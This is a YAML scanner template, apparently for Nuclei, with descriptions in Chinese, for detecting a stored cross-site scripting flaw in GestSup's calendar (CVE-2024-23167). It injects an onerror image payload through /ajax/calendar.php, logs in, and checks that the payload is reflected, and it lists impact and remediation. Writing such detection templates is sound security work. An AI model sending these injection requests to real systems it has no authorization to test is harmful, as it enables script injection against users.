id: gestsup-xss

info:
  name: GestSup - 跨站脚本漏洞（CVE-2024-23167）
  author: eeche,chae1xx1os,persona-twotwo,soonghee2,gy741
  severity: high
  description: |-
    GestSup 存在安全漏洞。攻击者可通过 /ajax/calendar.php 的 action, title, start 参数 注入恶意脚本，并在受害者浏览器上下文中执行任意 JavaScript。该模板通过请求 /ajax/calendar.php，并结合响应中的 {"event_id":"、text/html 等特征进行验证。
  impact: |-
    - 攻击者可在受害者浏览器中执行恶意脚本，导致会话劫持、页面篡改或敏感信息窃取。
    - 若漏洞位于后台或高权限页面，还可能被用于冒充受害者执行管理操作。
  remediation: |-
    - 尽快将 GestSup 升级到厂商已发布的修复版本，并结合官方公告核对受影响版本范围。
    - 对所有可控输入执行严格过滤与输出编码，避免未经过滤的脚本、HTML 标签或事件处理器进入页面响应。
  reference:
    - https://www.synacktiv.com/advisories/multiple-vulnerabilities-on-gestsup-3244
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-23167
    - https://doc.gestsup.fr/install/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
    cvss-score: 8.6
  metadata:
    max-request: 3
    vendor: gestsup
    product: gestsup
  tags: xss,gestsup,vuln

variables:
  formatted_date: "{{date_time('2006/01/02')}}"

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /ajax/calendar.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest

        action=add_event&title=<img/src/onerror=alert(document.domain)>&start={{formatted_date}} 07:30:00&end={{formatted_date}} 23:00:00&allday=false&technician=1

    matchers:
      - type: word
        part: response
        words:
          - '{"event_id":"'
          - 'text/html'
        condition: and
        internal: true

  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        login={{username}}&pass={{password}}&submit=submit

      - |
        GET /index.php?page=calendar HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'view=activity'
          - '?page=calendar'
          - '<img/src/onerror=alert(document.domain)>'
        condition: and

      - type: word
        part: header
        words:
          - text/html
